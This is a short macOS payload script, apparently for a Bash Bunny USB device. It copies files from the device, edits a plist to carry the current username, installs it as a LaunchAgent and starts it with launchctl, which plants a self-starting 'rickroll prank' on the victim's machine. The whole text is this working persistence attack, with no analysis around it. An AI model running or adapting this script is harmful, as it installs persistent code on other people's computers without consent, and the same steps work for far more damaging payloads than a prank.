mkdir $HOME/Rickroll
bash -c "cp /Volumes/BashBunny/payloads/switch2/* $HOME/Rickroll"
bash -c "sed -i -e \"s/blah/$USER/g\" $HOME/Rickroll/com.youtube.rickroll.prank.plist"
bash -c "cp $HOME/Rickroll/com.youtube.rickroll.prank.plist $HOME/Library/LaunchAgents/com.youtube.rickroll.prank.plist"
bash -c "chmod 644 $HOME/Library/LaunchAgents/com.youtube.rickroll.prank.plist"
bash -c "launchctl load ~/Library/LaunchAgents/com.youtube.rickroll.prank.plist"
bash -c "launchctl kickstart gui/$UID/com.youtube.rickroll.prank"
